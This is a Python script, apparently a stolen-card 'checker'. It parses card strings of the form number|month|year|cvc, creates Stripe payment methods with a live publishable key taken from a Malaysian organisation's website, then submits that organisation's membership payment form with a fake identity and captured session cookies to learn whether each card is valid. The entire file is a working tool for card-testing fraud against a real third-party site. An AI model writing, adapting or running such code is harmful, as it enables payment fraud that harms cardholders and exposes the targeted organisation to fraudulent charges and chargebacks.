import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fc9c125eeb4%3B+stripe-js-v3%2Fc9c125eeb4%3B+card-element&referrer=https%3A%2F%2Fwww.perkimselangor.org.my&time_on_page=80185&key=pk_live_51NaIqWBhOqJU3wd91DqqBdGzy7pF3vtmFibtdrrSATWKLDb6S5ddTC3DxngHMNTFThzg6y9QX9dklyDe7xOlaYbJ00UBarNVFl'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'pys_session_limit': 'true',
	    'pys_first_visit': 'true',
	    'pysTrafficSource': 'google.com',
	    'pys_landing_page': 'https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/',
	    'last_pysTrafficSource': 'google.com',
	    'last_pys_landing_page': 'https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/',
	    '_fbp': 'fb.1.1737378914996.9470751466',
	    '__stripe_mid': 'de9e881e-9c0f-495f-935e-cc8c1049008602f879',
	    '__stripe_sid': '6ea0c9b5-425c-49e3-9b90-eabe35ebdffc663107',
	    'pys_start_session': 'true',
	}
	
	headers = {
	    'authority': 'www.perkimselangor.org.my',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'pys_session_limit=true; pys_first_visit=true; pysTrafficSource=google.com; pys_landing_page=https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/; last_pysTrafficSource=google.com; last_pys_landing_page=https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/; _fbp=fb.1.1737378914996.9470751466; __stripe_mid=de9e881e-9c0f-495f-935e-cc8c1049008602f879; __stripe_sid=6ea0c9b5-425c-49e3-9b90-eabe35ebdffc663107; pys_start_session=true',
	    'origin': 'https://www.perkimselangor.org.my',
	    'referer': 'https://www.perkimselangor.org.my/pendaftaran-ahli-perkim/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1737379290090',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=1132&_fluentform_1_fluentformnonce=12f38c5687&_wp_http_referer=%2Fpendaftaran-ahli-perkim%2F&names%5Bfirst_name%5D=Rodam%20User&email=rodamuser08%40gmail.com&phone_1=%2B12084359362&numeric-field_1=071740&dropdown_1=Lelaki&input_text=US&dropdown_2=Lain-Lain&dropdown_3=Lain-Lain&dropdown_4=1.%20AMPANG&address2%5Baddress_line_1%5D=Street%2027&address2%5Bcity%5D=New%20York&address2%5Bstate%5D=New%20York&address2%5Bzip%5D=10080&payment_input_3=0&payment_method=stripe&image-upload%5B%5D=https%3A%2F%2Fwww.perkimselangor.org.my%2Fwp-content%2Fuploads%2Ffluentform%2Ftemp%2F8UksRRloI5Tln8JxnwqZl2mGIFGfhO%2Bbo8j2DdSkF3h9LQ8nQ2VOoPifiBu4umb0MOQsSg287irqE2sCOQT3koC2ew1ZFnutnYhBEsU2Tu9qCbQotsNS%2FOhbmkKMTlbELZf0s%2BaGmLKnfg1tkNHdNg%3D%3D&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '1',
	}
	
	r2 = requests.post(
	    'https://www.perkimselangor.org.my/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
